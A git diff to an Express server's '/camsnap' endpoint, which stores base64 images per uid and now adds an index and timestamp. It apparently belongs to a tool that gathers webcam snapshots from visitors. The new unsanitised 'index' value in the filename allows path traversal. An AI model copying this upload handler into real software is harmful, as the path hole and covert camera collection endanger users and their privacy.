@@ -165,18 +165,21 @@ app.post('/', (req, res) => {
 app.post('/camsnap', (req, res) => {
     const uid = decodeURIComponent(req.body.uid) || null;
     const img = decodeURIComponent(req.body.img) || null;
+    const index = decodeURIComponent(req.body.index) || '1';
 
     if (uid != null && img != null) {
         try {
             const buffer = Buffer.from(img, 'base64');
-            const filename = `camsnap_${Date.now()}.png`;
+            const filename = `camsnap_${Date.now()}_${index}.jpg`;
             const filepath = path.join(dataDir, filename);
 
             fs.writeFileSync(filepath, buffer);
 
             saveData(uid, {
                 type: 'camsnap',
-                filename: filename
+                filename: filename,
+                index: index,
+                timestamp: new Date().toISOString()
             });
 
             res.send('Done');
